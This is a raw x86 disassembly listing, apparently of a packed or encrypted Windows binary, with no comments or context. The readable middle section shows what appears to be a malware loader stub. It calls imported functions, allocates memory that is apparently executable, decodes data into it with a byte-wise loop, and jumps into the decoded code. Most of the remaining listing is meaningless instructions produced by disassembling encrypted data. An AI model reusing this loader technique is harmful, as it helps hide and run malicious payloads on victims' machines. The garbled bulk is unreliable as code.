  4212ed:	add    DWORD PTR [ebx-0x6b],edi
  4212f0:	lock adc eax,0xa9b6eff9
  4212f6:	or     BYTE PTR [edi+0x7a],ah
  4212f9:	idiv   ecx
  4212fb:	outs   dx,DWORD PTR ds:[esi]
  4212fc:	rcl    DWORD PTR ds:0x73c33362,cl
  421302:	and    DWORD PTR [eax],edx
  421304:	ds shr ecx,0x16
  421308:	retf   
  421309:	clc    
  42130a:	lds    ebp,FWORD PTR [edx-0x8bbeede]
  421310:	lahf   
  421311:	xor    DWORD PTR [ebx+eiz*2],edx
  421314:	pop    ebx
  421315:	call   0xa9dc5c4
  42131a:	mov    al,ds:0x7c03d367
  42131f:	sbb    bh,BYTE PTR [ebx+0x63]
  421322:	jmp    0x4212ea
  421324:	shl    BYTE PTR [ecx+0x51],1
  421327:	adc    edi,DWORD PTR [eax]
  421329:	test   BYTE PTR [eax-0x4d],0x0
  42132d:	out    dx,eax
  42132e:	adc    DWORD PTR [eax],esi
  421330:	jle    0x421392
  421332:	out    dx,al
  421333:	xchg   DWORD PTR [ebx+0x28],edi
  421336:	iret   
  421337:	hlt    
  421338:	mov    esp,0x89cd0347
  42133d:	lods   al,BYTE PTR ds:[esi]
  42133e:	stc    
  42133f:	push   0x4b77739d
  421344:	scas   eax,DWORD PTR es:[edi]
  421345:	mov    dh,BYTE PTR [edx]
  421347:	add    ah,BYTE PTR [edi+0x47]
  42134a:	aas    
  42134b:	xchg   ecx,eax
  42134c:	lock ins BYTE PTR es:[edi],dx
  42134e:	xchg   ebx,eax
  42134f:	add    BYTE PTR [ebx],al
  421351:	jb     0x4213a1
  421353:	adc    esi,DWORD PTR [ebp+ecx*2+0x14]
  421357:	pop    edx
  421358:	dec    esp
  421359:	mov    esi,0x58ea8a99
  42135e:	xlat   BYTE PTR ds:[ebx]
  42135f:	div    BYTE PTR [ecx+0x2f]
  421362:	mov    ch,0xed
  421364:	out    dx,eax
  421365:	mov    al,0x27
  421367:	cmp    eax,0xff9e2d59
  42136c:	or     edx,edx
  42136e:	fcomp  DWORD PTR [ecx+0x43b00eb7]
  421374:	adc    eax,0xe48381
  421379:	cmp    eax,0x62fd4164
  42137e:	das    
  42137f:	adc    edx,DWORD PTR [edi+ecx*8-0x4f]
  421383:	sub    edx,ebp
  421385:	enter  0x975d,0x74
  421389:	mov    ch,0x18
  42138b:	mov    bl,0x4d
  42138d:	push   ebx
  42138e:	or     al,0x97
  421390:	pop    edi
  421391:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421392:	cmp    dh,BYTE PTR [ecx+eax*4+0xe]
  421396:	sub    DWORD PTR [edx+0x38],0x7ce0c90e
  42139d:	pop    es
  42139e:	hlt    
  42139f:	(bad)  
  4213a0:	cld    
  4213a1:	cmp    bl,0x16
  4213a4:	push   ecx
  4213a5:	int3   
  4213a6:	scas   al,BYTE PTR es:[edi]
  4213a7:	popf   
  4213a8:	jmp    0x421368
  4213aa:	mov    ah,0xcb
  4213ac:	arpl   WORD PTR [edi-0x569350c3],cx
  4213b2:	jns    0x421366
  4213b4:	mov    eax,ds:0xd48c822a
  4213b9:	ins    BYTE PTR es:[edi],dx
  4213ba:	xchg   edi,eax
  4213bb:	mov    al,ds:0x5813a8f6
  4213c0:	mov    WORD PTR [ecx+0x44],fs
  4213c3:	mov    BYTE PTR [ecx-0x47],ah
  4213c6:	push   es
  4213c7:	add    edi,ecx
  4213c9:	mov    ch,0x59
  4213cb:	popa   
  4213cc:	shl    BYTE PTR [ebx+0x45734ba5],cl
  4213d2:	call   DWORD PTR [edi-0x2dbeda49]
  4213d8:	cmp    DWORD PTR [eax],esp
  4213da:	mov    ds:0xda6d7381,eax
  4213df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4213e0:	js     0x42138b
  4213e2:	out    dx,al
  4213e3:	iret   
  4213e4:	icebp  
  4213e5:	push   ebp
  4213e6:	sbb    BYTE PTR [edx-0x4b],0x99
  4213ea:	push   0x7d
  4213ec:	test   BYTE PTR [ebx],0xeb
  4213ef:	ja     0x421425
  4213f1:	mov    ebx,0x30768ded
  4213f6:	sub    al,0xcf
  4213f8:	pop    ecx
  4213f9:	dec    edx
  4213fa:	es dec ecx
  4213fc:	in     eax,0xe5
  4213fe:	cld    
  4213ff:	enter  0x7095,0x75
  421403:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421404:	jmp    0x4141:0x4122f155
  42140b:	jbe    0x4213e6
  42140d:	out    0xfa,eax
  42140f:	sar    ecx,cl
  421411:	adc    eax,0x1460dce3
  421416:	jo     0x421413
  421418:	fwait
  421419:	adc    eax,0x5df12719
  42141f:	mov    edx,ds
  421421:	loope  0x421478
  421423:	or     al,0x5
  421425:	stos   DWORD PTR es:[edi],eax
  421426:	push   ebp
  421427:	gs loopne 0x421473
  42142a:	sbb    dl,BYTE PTR [edi-0x324a1f7b]
  421430:	repnz scas eax,DWORD PTR es:[edi]
  421432:	fistp  WORD PTR [ecx]
  421434:	inc    ebp
  421435:	sub    eax,0x357c280
  42143a:	out    dx,eax
  42143b:	xor    al,0x12
  42143d:	(bad)  [edi]
  42143f:	es jmp 0x17ac:0xdbbb461
  421447:	xchg   BYTE PTR ds:[ebp+0x54f4050a],cl
  42144e:	sbb    al,0x58
  421450:	cmp    BYTE PTR [edi+0x7f],ah
  421453:	jb     0x421494
  421455:	or     al,0xac
  421457:	adc    ebp,edx
  421459:	mul    BYTE PTR [esi+0x76]
  42145c:	mov    edi,esp
  42145e:	mov    fs,WORD PTR [esi+0xc8106a5]
  421464:	outs   dx,BYTE PTR ds:[esi]
  421465:	ja     0x4213eb
  421467:	jmp    FWORD PTR [ebp-0x6d]
  42146a:	mov    esi,0x38949bb4
  42146f:	jmp    0xb3e50663
  421474:	ja     0x421477
  421476:	jo     0x421477
  421478:	add    esi,eax
  42147a:	mov    eax,ds:0x8f40e814
  42147f:	cmc    
  421480:	popa   
  421481:	test   BYTE PTR [esi],bl
  421483:	retf   
  421484:	jns    0x4214e8
  421486:	sub    esp,esp
  421488:	mov    bl,0xba
  42148a:	das    
  42148b:	xchg   DWORD PTR es:[ebp+0x57],ebx
  42148f:	jnp    0x421452
  421491:	cmp    al,0xcd
  421493:	push   edi
  421494:	pop    ds
  421495:	dec    esp
  421496:	test   DWORD PTR [edx],edx
  421498:	cmp    DWORD PTR [esp+esi*8-0x11b9b9d7],ecx
  42149f:	ins    DWORD PTR es:[edi],dx
  4214a0:	clc    
  4214a1:	push   esi
  4214a2:	sbb    DWORD PTR ds:0x6ab03a8c,0xb48b88eb
  4214ac:	xor    DWORD PTR [ebp+0x42787232],ebp
  4214b2:	(bad)  
  4214b4:	adc    DWORD PTR [ebx+0x4efdf90f],ebp
  4214ba:	mov    esi,0x8bc02694
  4214bf:	in     al,dx
  4214c0:	bound  ecx,QWORD PTR [esi-0x41]
  4214c3:	add    dh,BYTE PTR [ebx-0x72]
  4214c6:	pop    eax
  4214c7:	addr16 pop ss
  4214c9:	xor    eax,eax
  4214cb:	ret    
  4214cc:	nop
  4214cd:	nop
  4214ce:	nop
  4214cf:	nop
  4214d0:	push   ecx
  4214d1:	push   ebp
  4214d2:	mov    ebp,DWORD PTR [esp+0x10]
  4214d6:	xor    eax,eax
  4214d8:	test   ebp,ebp
  4214da:	push   esi
  4214db:	mov    DWORD PTR [esp+0x8],eax
  4214df:	mov    esi,0xfffffffd
  4214e4:	je     0x421546
  4214e6:	push   ebx
  4214e7:	push   edi
  4214e8:	mov    edi,DWORD PTR [esp+0x18]
  4214ec:	mov    DWORD PTR [esp+0x1c],0x1
  4214f4:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  4214f8:	add    esi,0x2
  4214fb:	inc    esi
  4214fc:	mov    BYTE PTR [esi+edi*1],cl
  4214ff:	mov    ecx,DWORD PTR [esp+0x24]
  421503:	movzx  ecx,BYTE PTR [eax+ecx*1]
  421507:	mov    edx,DWORD PTR [esp+0x10]
  42150b:	mov    eax,DWORD PTR [esp+0x1c]
  42150f:	add    edx,eax
  421511:	mov    DWORD PTR [esp+0x10],edx
  421515:	ror    eax,cl
  421517:	mov    eax,DWORD PTR [esp+0x10]
  42151b:	mov    edx,eax
  42151d:	shr    edx,0x3
  421520:	mov    ebx,0x1
  421525:	sub    ebx,edx
  421527:	imul   eax,ebx
  42152a:	mov    DWORD PTR [esp+0x10],eax
  42152e:	shl    ebx,0x3
  421531:	mov    bl,BYTE PTR [esi+edi*1]
  421534:	add    bl,cl
  421536:	mov    ecx,DWORD PTR [esp+0x20]
  42153a:	mov    BYTE PTR [esi+edi*1],bl
  42153d:	sub    esi,0x2
  421540:	cmp    esi,ecx
  421542:	jl     0x4214f4
  421544:	pop    edi
  421545:	pop    ebx
  421546:	pop    esi
  421547:	pop    ebp
  421548:	pop    ecx
  421549:	ret    
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x78
  421556:	push   esi
  421557:	mov    DWORD PTR [ebp-0x50],0x0
  42155e:	mov    DWORD PTR [ebp-0x18],0x0
  421565:	mov    DWORD PTR [ebp-0x78],0x0
  42156c:	mov    DWORD PTR [ebp-0x68],0x0
  421573:	mov    DWORD PTR [ebp-0x8],0x0
  42157a:	mov    DWORD PTR [ebp-0x74],0x0
  421581:	mov    DWORD PTR [ebp-0x70],0x0
  421588:	mov    DWORD PTR [ebp-0x14],0x0
  42158f:	mov    DWORD PTR [ebp-0x54],0x0
  421596:	mov    DWORD PTR [ebp-0x10],0x0
  42159d:	mov    DWORD PTR [ebp-0x60],0x0
  4215a4:	mov    DWORD PTR [ebp-0x4],0x0
  4215ab:	mov    DWORD PTR [ebp-0x64],0x0
  4215b2:	mov    DWORD PTR [ebp-0x30],0x0
  4215b9:	mov    DWORD PTR [ebp-0x5c],0x0
  4215c0:	mov    DWORD PTR [ebp-0x2c],0x0
  4215c7:	mov    DWORD PTR [ebp-0x58],0x0
  4215ce:	mov    DWORD PTR [ebp-0xc],0x0
  4215d5:	mov    eax,ds:0x428108
  4215da:	mov    DWORD PTR [ebp-0x28],eax
  4215dd:	mov    ecx,DWORD PTR ds:0x42810c
  4215e3:	mov    DWORD PTR [ebp-0x24],ecx
  4215e6:	mov    edx,DWORD PTR ds:0x428110
  4215ec:	mov    DWORD PTR [ebp-0x20],edx
  4215ef:	mov    al,ds:0x428114
  4215f4:	mov    BYTE PTR [ebp-0x1c],al
  4215f7:	mov    ecx,DWORD PTR ds:0x4280f8
  4215fd:	mov    DWORD PTR [ebp-0x40],ecx
  421600:	mov    edx,DWORD PTR ds:0x4280fc
  421606:	mov    DWORD PTR [ebp-0x3c],edx
  421609:	mov    eax,ds:0x428100
  42160e:	mov    DWORD PTR [ebp-0x38],eax
  421611:	mov    cx,WORD PTR ds:0x428104
  421618:	mov    WORD PTR [ebp-0x34],cx
  42161c:	mov    dl,BYTE PTR ds:0x428106
  421622:	mov    BYTE PTR [ebp-0x32],dl
  421625:	mov    DWORD PTR [ebp-0x30],0x40
  42162c:	lea    eax,[ebp-0x10]
  42162f:	push   eax
  421630:	lea    ecx,[ebp-0x10]
  421633:	push   ecx
  421634:	lea    edx,[ebp-0x14]
  421637:	push   edx
  421638:	call   DWORD PTR ds:0x428000
  42163e:	test   eax,eax
  421640:	je     0x42164b
  421642:	mov    eax,DWORD PTR [ebp-0x10]
  421645:	add    eax,0x1
  421648:	mov    DWORD PTR [ebp-0x10],eax
  42164b:	mov    DWORD PTR [ebp-0x48],0x0
  421652:	mov    DWORD PTR [ebp-0x4c],0x0
  421659:	lea    ecx,[ebp-0x14]
  42165c:	push   ecx
  42165d:	call   DWORD PTR ds:0x428004
  421663:	mov    BYTE PTR [ebp-0x40],0x56
  421667:	call   DWORD PTR ds:0x428014
  42166d:	mov    DWORD PTR [ebp-0x2c],eax
  421670:	mov    BYTE PTR [ebp-0x3e],0x72
  421674:	movzx  edx,WORD PTR [ebp-0x2c]
  421678:	test   edx,edx
  42167a:	jne    0x4216bc
  42167c:	mov    BYTE PTR [ebp-0x34],0x0
  421680:	mov    DWORD PTR [ebp-0x14],0xe0d
  421687:	lea    eax,[ebp-0x28]
  42168a:	push   eax
  42168b:	call   DWORD PTR ds:0x428018
  421691:	mov    DWORD PTR [ebp-0x68],eax
  421694:	mov    DWORD PTR [ebp-0x5c],0x3a
  42169b:	lea    ecx,[ebp-0x40]
  42169e:	push   ecx
  42169f:	mov    edx,DWORD PTR [ebp-0x68]
  4216a2:	push   edx
  4216a3:	call   DWORD PTR ds:0x42801c
  4216a9:	mov    DWORD PTR [ebp-0x44],eax
  4216ac:	mov    DWORD PTR [ebp-0x8],0xf893c0a3
  4216b3:	mov    DWORD PTR [ebp-0x70],0x10c93f
  4216ba:	jmp    0x4216d1
  4216bc:	mov    BYTE PTR ds:0x443a58,0x0
  4216c3:	mov    BYTE PTR ds:0x42bb88,0x0
  4216ca:	mov    BYTE PTR ds:0x441b18,0x0
  4216d1:	mov    DWORD PTR [ebp-0x2c],0x410000
  4216d8:	push   DWORD PTR ds:0x428018
  4216de:	pop    edx
  4216df:	mov    DWORD PTR [ebp-0x74],edx
  4216e2:	push   DWORD PTR [ebp-0x30]
  4216e5:	push   0x1000
  4216ea:	mov    eax,DWORD PTR [ebp-0x14]
  4216ed:	add    eax,0x23
  4216f0:	add    eax,0x23
  4216f3:	push   eax
  4216f4:	xor    eax,eax
  4216f6:	push   eax
  4216f7:	mov    ecx,DWORD PTR [ebp-0x44]
  4216fa:	call   ecx
  4216fc:	mov    edx,eax
  4216fe:	mov    DWORD PTR [ebp-0x4],edx
  421701:	mov    eax,DWORD PTR [ebp-0x70]
  421704:	sub    eax,0xdae0b
  421709:	mov    DWORD PTR [ebp-0x70],eax
  42170c:	cmp    DWORD PTR [ebp-0x4],0x0
  421710:	jne    0x421719
  421712:	mov    BYTE PTR ds:0x441b18,0x0
  421719:	mov    ecx,DWORD PTR [ebp-0x4]
  42171c:	add    ecx,DWORD PTR [ebp-0x14]
  42171f:	mov    edx,DWORD PTR [ebp-0x8]
  421722:	mov    DWORD PTR [ecx],edx
  421724:	mov    eax,DWORD PTR [ebp-0x4]
  421727:	add    eax,DWORD PTR [ebp-0x5c]
  42172a:	mov    DWORD PTR [ebp-0x64],eax
  42172d:	mov    ecx,DWORD PTR ds:0x42801c
  421733:	mov    DWORD PTR [ebp-0x54],ecx
  421736:	mov    edx,DWORD PTR [ebp-0x4]
  421739:	add    edx,DWORD PTR [ebp-0x14]
  42173c:	mov    eax,DWORD PTR [ebp+0x8]
  42173f:	mov    DWORD PTR [edx+0x4],eax
  421742:	mov    ecx,DWORD PTR [ebp-0x4]
  421745:	add    ecx,DWORD PTR [ebp-0x14]
  421748:	mov    DWORD PTR [ebp-0xc],ecx
  42174b:	cmp    DWORD PTR [ebp-0x70],0x0
  42174f:	jbe    0x42176c
  421751:	mov    edx,DWORD PTR [ebp-0xc]
  421754:	push   edx
  421755:	mov    eax,DWORD PTR [ebp-0x14]
  421758:	push   eax
  421759:	mov    ecx,DWORD PTR [ebp-0x2c]
  42175c:	add    ecx,DWORD PTR [ebp-0x70]
  42175f:	push   ecx
  421760:	mov    edx,DWORD PTR [ebp-0x4]
  421763:	push   edx
  421764:	call   0x4214d0
  421769:	add    esp,0x10
  42176c:	cmp    DWORD PTR [ebp-0x64],0x0
  421770:	je     0x421784
  421772:	mov    ecx,DWORD PTR [ebp-0x54]
  421775:	push   ecx
  421776:	push   DWORD PTR [ebp-0x74]
  421779:	mov    esi,DWORD PTR [ebp-0x64]
  42177c:	push   edx
  42177d:	pop    eax
  42177e:	push   ecx
  42177f:	nop
  421780:	jmp    esi
  421782:	jmp    0x42178a
  421784:	mov    eax,DWORD PTR [ebp+0x8]
  421787:	mov    DWORD PTR [ebp-0x18],eax
  42178a:	mov    eax,0x1
  42178f:	pop    esi
  421790:	mov    esp,ebp
  421792:	pop    ebp
  421793:	ret    
  421794:	int3   
  421795:	int3   
  421796:	int3   
  421797:	int3   
  421798:	int3   
  421799:	int3   
  42179a:	int3   
  42179b:	int3   
  42179c:	int3   
  42179d:	int3   
  42179e:	int3   
  42179f:	int3   
  4217a0:	push   ebp
  4217a1:	mov    ebp,esp
  4217a3:	sub    esp,0x8
  4217a6:	mov    eax,ds:0x428014
  4217ab:	push   0x0
  4217ad:	push   0xb2
  4217b2:	push   0x82
  4217b7:	push   0x0
  4217b9:	push   0xffffffff
  4217bb:	mov    DWORD PTR [ebp-0x4],0x0
  4217c2:	mov    DWORD PTR [ebp-0x8],eax
  4217c5:	call   DWORD PTR ds:0x428010
  4217cb:	push   DWORD PTR [ebp-0x8]
  4217ce:	pop    edx
  4217cf:	call   edx
  4217d1:	push   eax
  4217d2:	pop    DWORD PTR [ebp-0x4]
  4217d5:	mov    eax,DWORD PTR [ebp-0x4]
  4217d8:	dec    eax
  4217d9:	cmp    eax,0x56
  4217dc:	jne    0x4217eb
  4217de:	push   0xdf058ce9
  4217e3:	call   0x421550
  4217e8:	add    esp,0x4
  4217eb:	xor    eax,eax
  4217ed:	mov    esp,ebp
  4217ef:	pop    ebp
  4217f0:	ret    
  4217f1:	nop
  4217f2:	nop
  4217f3:	nop
  4217f4:	nop
  4217f5:	nop
  4217f6:	nop
  4217f7:	nop
  4217f8:	nop
  4217f9:	nop
  4217fa:	nop
  4217fb:	nop
  4217fc:	nop
  4217fd:	nop
  4217fe:	nop
  4217ff:	nop
  421800:	sub    esp,0x10
  421803:	lea    eax,[esp+0x0]
  421807:	push   eax
  421808:	call   DWORD PTR ds:0x42800c
  42180e:	cmp    WORD PTR [esp+0x0],0x0
  421814:	je     0x42182d
  421816:	push   0x0
  421818:	call   0x4217a0
  42181d:	add    esp,0x4
  421820:	call   0x411000
  421825:	xor    eax,eax
  421827:	add    esp,0x10
  42182a:	ret    0x10
  42182d:	jmp    FWORD PTR [edi]
  42182f:	stos   DWORD PTR es:[edi],eax
  421830:	xor    ebp,DWORD PTR [edi]
  421832:	sar    BYTE PTR [edi+ebp*4],0x92
  421836:	out    0x96,al
  421838:	ds out dx,eax
  42183a:	ds popf 
  42183c:	icebp  
  42183d:	mov    ds:0xaf3cc397,eax
  421842:	xchg   edx,eax
  421843:	loop   0x4217db
  421845:	ds scas eax,DWORD PTR es:[edi]
  421847:	shl    DWORD PTR [edx-0xf],0xa3
  42184b:	das    
  42184c:	ret    
  42184d:	cmp    al,0xaf
  42184f:	xchg   edx,eax
  421850:	loop   0x4217e8
  421852:	ds out dx,eax
  421854:	shl    DWORD PTR [edx-0xf],0xa3
  421858:	das    
  421859:	ret    
  42185a:	cmp    al,0xaf
  42185c:	xchg   edx,eax
  42185d:	loop   0x4217f5
  42185f:	ds out dx,eax
  421861:	shl    DWORD PTR [edx-0xf],0xa3
  421865:	das    
  421866:	ret    
  421867:	cmp    al,0xaf
  421869:	xchg   edx,eax
  42186a:	sbb    dl,BYTE PTR [esi+0x7dcfef3e]
  421870:	dec    ebx
  421871:	lods   eax,DWORD PTR ds:[esi]
  421872:	das    
  421873:	ja     0x4218aa
  421875:	bound  esi,QWORD PTR [ebx+0x2272975a]
  42187b:	loopne 0x4218b3
  42187d:	cdq    
  42187e:	retf   0xe35c
  421881:	dec    esp
  421882:	(bad)  
  421884:	test   esp,esp
  421886:	pop    edi
  421887:	and    cl,0x1
  42188a:	nop
  42188b:	int    0x41
  42188d:	lods   al,BYTE PTR ds:[esi]
  42188e:	dec    eax
  42188f:	(bad)  
  421890:	lock xchg DWORD PTR [esi+0x42af9a4c],esi
  421897:	cwde   
  421898:	int    0xf
  42189a:	xchg   DWORD PTR [ebx-0x4],esi
  42189d:	mov    dl,0x8f
  42189f:	stc    
  4218a0:	pop    edx
  4218a1:	mov    ch,bh
  4218a3:	outs   dx,DWORD PTR ds:[esi]
  4218a4:	cld    
  4218a5:	test   eax,0xaf3cc30b
  4218aa:	xchg   edx,eax
  4218ab:	loop   0x421843
  4218ad:	ds call 0xe0eab70b
  4218b3:	xlat   BYTE PTR ds:[ebx]
  4218b4:	push   ecx
  4218b5:	ss in  al,dx
  4218b7:	push   0x70
  4218b9:	pushf  
  4218ba:	jge    0x4218d3
  4218bc:	push   ebx
  4218bd:	push   0xc923c6a9
  4218c2:	arpl   WORD PTR [edi+0x0],dx
  4218c5:	call   0xcc197498
  4218ca:	mov    al,ds:0x9b253109
  4218cf:	pop    ecx
  4218d0:	xchg   esi,eax
  4218d1:	cwde   
  4218d2:	mov    ch,BYTE PTR [esi-0x54]
  4218d5:	in     eax,0xed
  4218d7:	in     al,dx
  4218d8:	enter  0x69a9,0x3b
  4218dc:	scas   al,BYTE PTR es:[edi]
  4218dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4218de:	fsub   DWORD PTR [edx-0x79]
  4218e1:	xor    al,0xa5
  4218e3:	cmp    eax,esi
  4218e5:	sti    
  4218e6:	jmp    0xf778db9a
  4218eb:	push   0x70
  4218ed:	pushf  
  4218ee:	jge    0x421907
  4218f0:	push   edx
  4218f1:	push   0xc9bd5ad9
  4218f6:	xor    DWORD PTR [edi+0x12],0xffffffe8
  4218fa:	fcmovnb st,st(6)
  4218fc:	jge    0x4218c9
  4218fe:	cmp    dl,BYTE PTR [esi+ebx*4+0x3dc4cb25]
  421905:	cwde   
  421906:	mov    edx,0x83e536f3
  42190b:	call   0xa533:0xa677a963
  421912:	rcr    BYTE PTR [edx],1
  421914:	add    al,0x34
  421916:	mov    ebp,0xe09901a8
  42191b:	xlat   BYTE PTR ds:[ebx]
  42191c:	push   ecx
  42191d:	ss scas eax,DWORD PTR es:[edi]
  42191f:	xchg   edx,eax
  421920:	loop   0x4218b8
  421922:	ds out dx,eax
  421924:	shl    DWORD PTR [edx-0x5f],0xe6
  421928:	das    
  421929:	ret    
  42192a:	jo     0x4218da
  42192c:	nop
  42192d:	loop   0x421965
  42192f:	out    dx,al
  421930:	test   BYTE PTR [esi+0x2fa3f162],cl
  421936:	ret    
  421937:	cmp    al,0xaf
  421939:	xchg   edx,eax
  42193a:	add    dl,BYTE PTR [esi+0x63caee3d]
  421940:	sti    
  421941:	mov    ds:0xaf382d2f,eax
  421946:	xchg   edx,eax
  421947:	pop    esi
  421948:	nop
  421949:	ds out dx,eax
  42194b:	shl    DWORD PTR [edx-0xf],0xb2
  42194f:	xchg   edx,eax
  421950:	ret    
  421951:	cmp    al,0xaf
  421953:	and    dl,0x96
  421956:	ds out dx,eax
  421958:	les    esp,FWORD PTR [edx-0xf]
  42195b:	mov    ds:0xbf3cc36e,eax
  421960:	xchg   edx,eax
  421961:	loop   0x4218f9
  421963:	cmp    al,0xef
  421965:	shl    DWORD PTR [edi-0xf],0xa2
  421969:	das    
  42196a:	ret    
  42196b:	cmp    al,0xaf
  42196d:	xchg   edx,eax
  42196e:	out    0x96,eax
  421970:	aas    
  421971:	out    dx,eax
  421972:	shl    DWORD PTR [edx-0xf],0xa3
  421976:	das    
  421977:	xchg   ebx,eax
  421978:	xor    BYTE PTR [edi+0x3e96e692],ch
  42197e:	out    dx,al
  42197f:	and    eax,0x2fa1f167
  421984:	ret    
  421985:	mov    esp,0x96f292af
  42198a:	ds inc ecx
  42198d:	(bad)  
  42198f:	mov    ds:0xbf3cc33f,eax
  421994:	xchg   edx,eax
  421995:	loop   0x42192d
  421997:	ds out dx,eax
  421999:	shl    DWORD PTR [edx-0xf],0xa3
  42199d:	das    
  42199e:	ret    
  42199f:	cmp    al,0xaf
  4219a1:	xchg   edx,eax
  4219a2:	loop   0x42193a
  4219a4:	ds out dx,eax
  4219a6:	xor    eax,0x46a3fd5b
  4219ab:	sar    BYTE PTR [edi+ebp*4],0x92
  4219af:	adc    bl,BYTE PTR [ebp+0x6288a03e]
  4219b5:	icebp  
  4219b6:	mov    ds:0xaf3cc32f,eax
  4219bb:	xchg   edx,eax
  4219bc:	loop   0x421954
  4219be:	ds out dx,eax
  4219c0:	shl    DWORD PTR [edx-0xf],0xa3
  4219c4:	das    
  4219c5:	ret    
  4219c6:	cmp    al,0xaf
  4219c8:	xchg   edx,eax
  4219c9:	loop   0x421961
  4219cb:	ds out dx,eax
  4219cd:	shl    DWORD PTR [edx-0xf],0xa3
  4219d1:	das    
  4219d2:	ret    
  4219d3:	cmp    al,0xaf
  4219d5:	xchg   edx,eax
  4219d6:	loop   0x42196e
  4219d8:	ds out dx,eax
  4219da:	shl    DWORD PTR [edx-0xf],0xa3
  4219de:	das    
  4219df:	ret    
  4219e0:	cmp    al,0xaf
  4219e2:	xchg   edx,eax
  4219e3:	loop   0x42197b
  4219e5:	ds out dx,eax
  4219e7:	shl    DWORD PTR [edx-0xf],0xa3
  4219eb:	das    
  4219ec:	ret    
  4219ed:	cmp    al,0xaf
  4219ef:	xchg   edx,eax
  4219f0:	loop   0x421988
  4219f2:	ds out dx,eax
  4219f4:	shl    DWORD PTR [edx-0xf],0xa3
  4219f8:	das    
  4219f9:	ret    
  4219fa:	cmp    al,0xaf
  4219fc:	xchg   edx,eax
  4219fd:	loop   0x421995
  4219ff:	ds out dx,eax
  421a01:	shl    DWORD PTR [edx-0xf],0xa3
  421a05:	das    
  421a06:	ret    
  421a07:	cmp    al,0xaf
  421a09:	xchg   edx,eax
  421a0a:	loop   0x4219a2
  421a0c:	ds out dx,eax
  421a0e:	shl    DWORD PTR [edx-0xf],0xa3
  421a12:	das    
  421a13:	ret    
  421a14:	cmp    al,0xaf
  421a16:	xchg   edx,eax
  421a17:	loop   0x4219af
  421a19:	ds out dx,eax
  421a1b:	shl    DWORD PTR [edx-0xf],0x8d
  421a1f:	pop    ebx
  421a20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a21:	inc    esp
  421a22:	fist   DWORD PTR [edx+0xf3e96e2]
  421a28:	retf   0xf162
  421a2b:	mov    bl,0x2f
  421a2d:	ret    
  421a2e:	cmp    al,0x7b
  421a30:	xchg   esi,eax
  421a31:	loop   0x4219c9
  421a33:	cmp    ch,bh
  421a35:	shl    DWORD PTR [edx],0xb4
  421a38:	loopne 0x421a57
  421a3a:	xchg   edi,eax
  421a3b:	jae    0x4219ec
  421a3d:	xchg   edx,eax
  421a3e:	loop   0x4219d6
  421a40:	ds out dx,eax
  421a42:	loope  0x421aa6
  421a44:	icebp  
  421a45:	inc    ebx
  421a46:	add    DWORD PTR [ecx-0x1d0e22b1],esi
  421a4c:	xchg   esi,eax
  421a4d:	ds out dx,eax
  421a4f:	mov    eax,ds:0xdfa3f162
  421a54:	enter  0xaf3c,0xc8
  421a58:	loop   0x4219f0
  421a5a:	ds aaa 
  421a5c:	lds    esp,FWORD PTR [edx-0xf]
  421a5f:	mov    ds:0xaf3cc32f,eax
  421a64:	xchg   edx,eax
  421a65:	loop   0x4219fd
  421a67:	ds out dx,eax
  421a69:	rol    DWORD PTR [edx-0xf],0xa3
  421a6d:	iret   
  421a6e:	ret    
  421a6f:	cmp    al,0xaf
  421a71:	xchg   edx,eax
  421a72:	loop   0x421a0a
  421a74:	ds out dx,eax
  421a76:	shl    DWORD PTR [edx-0xf],0xa3
  421a7a:	das    
  421a7b:	ret    
  421a7c:	cmp    al,0xaf
  421a7e:	xchg   edx,eax
  421a7f:	loop   0x421a17
  421a81:	ds out dx,eax
  421a83:	shl    DWORD PTR [edx-0xf],0xa3
  421a87:	das    
  421a88:	ret    
  421a89:	cmp    al,0xaf
  421a8b:	xchg   edx,eax
  421a8c:	loop   0x421a24
  421a8e:	ds out dx,eax
  421a90:	shl    DWORD PTR [edx-0xf],0xa3
  421a94:	das    
  421a95:	ret    
  421a96:	cmp    al,0xaf
  421a98:	xchg   edx,eax
  421a99:	loop   0x421a31
  421a9b:	ds out dx,eax
  421a9d:	shl    DWORD PTR [edx-0xf],0xa3
  421aa1:	das    
  421aa2:	ret    
  421aa3:	cmp    al,0xaf
  421aa5:	xchg   edx,eax
  421aa6:	loop   0x421a3e
  421aa8:	ds out dx,eax
  421aaa:	shl    DWORD PTR [edx-0xf],0xa3
  421aae:	das    
  421aaf:	ret    
  421ab0:	cmp    al,0xaf
  421ab2:	xchg   edx,eax
  421ab3:	loop   0x421a4b
  421ab5:	ds out dx,eax
  421ab7:	shl    DWORD PTR [edx-0xf],0xa3
  421abb:	das    
  421abc:	ret    
  421abd:	cmp    al,0xaf
  421abf:	xchg   edx,eax
  421ac0:	loop   0x421a58
  421ac2:	ds out dx,eax
  421ac4:	shl    DWORD PTR [edx-0xf],0xa3
  421ac8:	das    
  421ac9:	ret    
  421aca:	cmp    al,0xaf
  421acc:	xchg   edx,eax
  421acd:	loop   0x421a65
  421acf:	ds out dx,eax
  421ad1:	shl    DWORD PTR [edx-0xf],0xa3
  421ad5:	das    
  421ad6:	ret    
  421ad7:	cmp    al,0xaf
  421ad9:	xchg   edx,eax
  421ada:	loop   0x421a72
  421adc:	ds out dx,eax
  421ade:	shl    DWORD PTR [edx-0xf],0xa3
  421ae2:	das    
  421ae3:	ret    
  421ae4:	cmp    al,0xaf
  421ae6:	xchg   edx,eax
  421ae7:	loop   0x421a7f
  421ae9:	ds out dx,eax
  421aeb:	shl    DWORD PTR [edx-0xf],0xa3
  421aef:	das    
  421af0:	ret    
  421af1:	cmp    al,0xaf
  421af3:	xchg   edx,eax
  421af4:	loop   0x421a8c
  421af6:	ds out dx,eax
  421af8:	shl    DWORD PTR [edx-0xf],0xa3
  421afc:	das    
  421afd:	ret    
  421afe:	cmp    al,0xaf
  421b00:	xchg   edx,eax
  421b01:	loop   0x421a99
  421b03:	ds out dx,eax
  421b05:	shl    DWORD PTR [edx-0xf],0xa3
  421b09:	das    
  421b0a:	ret    
  421b0b:	cmp    al,0xaf
  421b0d:	xchg   edx,eax
